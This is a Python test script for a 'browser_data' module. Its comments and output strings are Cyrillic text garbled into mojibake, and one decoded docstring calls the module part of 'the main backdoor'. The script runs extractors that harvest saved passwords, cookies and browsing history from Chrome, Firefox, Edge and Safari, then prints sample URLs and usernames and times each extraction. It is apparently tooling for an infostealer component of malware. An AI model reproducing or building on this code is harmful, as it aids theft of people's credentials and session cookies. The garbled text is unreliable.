#!/usr/bin/env python3
"""
–¢–µ—Å—Ç–æ–≤—ã–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ Browser Data —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏.
"""

import platform
import sys
from browser_data import BrowserDataExtractor, test_browser_extraction

def test_browser_extractors():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ —ç–∫—Å—Ç—Ä–∞–∫—Ç–æ—Ä—ã –±—Ä–∞—É–∑–µ—Ä–æ–≤."""
    print("üß™ –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï BROWSER DATA EXTRACTORS")
    print("=" * 50)
    
    extractor = BrowserDataExtractor()
    
    print("üìä –î–æ—Å—Ç—É–ø–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä—ã:")
    available_browsers = extractor.get_available_browsers()
    for browser in available_browsers:
        print(f"  - {browser}")
    
    if not available_browsers:
        print("  ‚ùå –ù–µ –Ω–∞–π–¥–µ–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤")
        return
    
    print(f"\nüîç –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö:")
    
    # –¢–µ—Å—Ç–∏—Ä—É–µ–º –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π
    print("\nüîê –ü–∞—Ä–æ–ª–∏:")
    passwords_result = extractor.extract_passwords()
    if passwords_result["success"]:
        print(f"  ‚úÖ –ù–∞–π–¥–µ–Ω–æ –ø–∞—Ä–æ–ª–µ–π: {len(passwords_result['passwords'])}")
        for pwd in passwords_result["passwords"][:3]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 3
            print(f"    - {pwd['url']}: {pwd['username']}")
    else:
        print(f"  ‚ùå –û—à–∏–±–∫–∞: {passwords_result['error']}")
    
    # –¢–µ—Å—Ç–∏—Ä—É–µ–º –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –∫—É–∫–∏
    print("\nüç™ –ö—É–∫–∏:")
    cookies_result = extractor.extract_cookies()
    if cookies_result["success"]:
        print(f"  ‚úÖ –ù–∞–π–¥–µ–Ω–æ –∫—É–∫–∏: {len(cookies_result['cookies'])}")
        for cookie in cookies_result["cookies"][:3]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 3
            print(f"    - {cookie['domain']}: {cookie['name']}")
    else:
        print(f"  ‚ùå –û—à–∏–±–∫–∞: {cookies_result['error']}")
    
    # –¢–µ—Å—Ç–∏—Ä—É–µ–º –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏
    print("\nüìö –ò—Å—Ç–æ—Ä–∏—è:")
    history_result = extractor.extract_history()
    if history_result["success"]:
        print(f"  ‚úÖ –ù–∞–π–¥–µ–Ω–æ –∑–∞–ø–∏—Å–µ–π –∏—Å—Ç–æ—Ä–∏–∏: {len(history_result['history'])}")
        for entry in history_result["history"][:3]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 3
            print(f"    - {entry['url']}")
    else:
        print(f"  ‚ùå –û—à–∏–±–∫–∞: {history_result['error']}")
    
    print(f"\n‚úÖ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")

def test_integration():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—é —Å –æ—Å–Ω–æ–≤–Ω—ã–º –±—ç–∫–¥–æ—Ä–æ–º."""
    print("\nüîó –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ò–ù–¢–ï–ì–†–ê–¶–ò–ò")
    print("=" * 30)
    
    try:
        from browser_data import extract_all_browser_data, extract_browser_passwords, extract_browser_cookies, extract_browser_history
        
        print("üì¶ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ extract_all_browser_data:")
        results = extract_all_browser_data()
        print(f"  –û–±—â–∏–π —É—Å–ø–µ—Ö: {results.get('success', False)}")
        print(f"  –í—Å–µ–≥–æ –ø–∞—Ä–æ–ª–µ–π: {results.get('total_passwords', 0)}")
        print(f"  –í—Å–µ–≥–æ –∫—É–∫–∏: {results.get('total_cookies', 0)}")
        print(f"  –í—Å–µ–≥–æ –∏—Å—Ç–æ—Ä–∏–∏: {results.get('total_history', 0)}")
        
        print("\nüì¶ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ extract_browser_passwords:")
        pwd_result = extract_browser_passwords()
        print(f"  –£—Å–ø–µ—Ö: {pwd_result['success']}")
        print(f"  –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Ä–æ–ª–µ–π: {len(pwd_result.get('passwords', []))}")
        
        print("\nüì¶ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ extract_browser_cookies:")
        cookie_result = extract_browser_cookies()
        print(f"  –£—Å–ø–µ—Ö: {cookie_result['success']}")
        print(f"  –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫—É–∫–∏: {len(cookie_result.get('cookies', []))}")
        
        print("\nüì¶ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ extract_browser_history:")
        history_result = extract_browser_history()
        print(f"  –£—Å–ø–µ—Ö: {history_result['success']}")
        print(f"  –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø–∏—Å–µ–π: {len(history_result.get('history', []))}")
        
        print("\n‚úÖ –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Ä–∞–±–æ—Ç–∞–µ—Ç –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ")
        
    except ImportError as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∏–º–ø–æ—Ä—Ç–∞: {e}")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏: {e}")

def test_security():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö."""
    print("\nüîí –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò")
    print("=" * 30)
    
    extractor = BrowserDataExtractor()
    
    # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä—ã
    browsers = ['chrome', 'firefox', 'edge', 'safari']
    
    print("üåê –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ –±—Ä–∞—É–∑–µ—Ä—ã:")
    for browser in browsers:
        extractor_instance = extractor.browsers[browser]
        installed = extractor_instance.is_installed()
        print(f"  - {browser}: {'‚úÖ –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω' if installed else '‚ùå –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω'}")
    
    print(f"\nüîç –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã:")
    print(f"  –¢–µ–∫—É—â–∞—è –û–°: {platform.system()}")
    
    if platform.system() == "Windows":
        print("  ‚úÖ Windows - –ø–æ–ª–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞ –≤—Å–µ—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤")
    elif platform.system() == "Darwin":
        print("  ‚úÖ macOS - –ø–æ–¥–¥–µ—Ä–∂–∫–∞ Chrome, Firefox, Safari")
    elif platform.system() == "Linux":
        print("  ‚úÖ Linux - –ø–æ–¥–¥–µ—Ä–∂–∫–∞ Chrome, Firefox")
    else:
        print("  ‚ö†Ô∏è –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –û–° - –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞")
    
    print("\n‚úÖ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")

def test_performance():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö."""
    print("\n‚ö° –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ü–†–û–ò–ó–í–û–î–ò–¢–ï–õ–¨–ù–û–°–¢–ò")
    print("=" * 35)
    
    import time
    
    extractor = BrowserDataExtractor()
    
    # –¢–µ—Å—Ç–∏—Ä—É–µ–º –≤—Ä–µ–º—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –ø–∞—Ä–æ–ª–µ–π
    print("üîê –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –ø–∞—Ä–æ–ª–µ–π:")
    start_time = time.time()
    passwords_result = extractor.extract_passwords()
    end_time = time.time()
    print(f"  –í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {end_time - start_time:.2f} —Å–µ–∫—É–Ω–¥")
    print(f"  –ù–∞–π–¥–µ–Ω–æ –ø–∞—Ä–æ–ª–µ–π: {len(passwords_result.get('passwords', []))}")
    
    # –¢–µ—Å—Ç–∏—Ä—É–µ–º –≤—Ä–µ–º—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∫—É–∫–∏
    print("\nüç™ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∫—É–∫–∏:")
    start_time = time.time()
    cookies_result = extractor.extract_cookies()
    end_time = time.time()
    print(f"  –í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {end_time - start_time:.2f} —Å–µ–∫—É–Ω–¥")
    print(f"  –ù–∞–π–¥–µ–Ω–æ –∫—É–∫–∏: {len(cookies_result.get('cookies', []))}")
    
    # –¢–µ—Å—Ç–∏—Ä—É–µ–º –≤—Ä–µ–º—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∏—Å—Ç–æ—Ä–∏–∏
    print("\nüìö –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∏—Å—Ç–æ—Ä–∏–∏:")
    start_time = time.time()
    history_result = extractor.extract_history()
    end_time = time.time()
    print(f"  –í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {end_time - start_time:.2f} —Å–µ–∫—É–Ω–¥")
    print(f"  –ù–∞–π–¥–µ–Ω–æ –∑–∞–ø–∏—Å–µ–π: {len(history_result.get('history', []))}")
    
    print("\n‚úÖ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è."""
    print("üöÄ –ó–ê–ü–£–°–ö –¢–ï–°–¢–û–í BROWSER DATA")
    print("=" * 50)
    
    try:
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –±–∞–∑–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        test_browser_extraction()
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º —ç–∫—Å—Ç—Ä–∞–∫—Ç–æ—Ä—ã
        test_browser_extractors()
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—é
        test_integration()
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
        test_security()
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å
        test_performance()
        
        print("\nüéâ –í–°–ï –¢–ï–°–¢–´ –ó–ê–í–ï–†–®–ï–ù–´ –£–°–ü–ï–®–ù–û!")
        
    except Exception as e:
        print(f"\n‚ùå –û—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
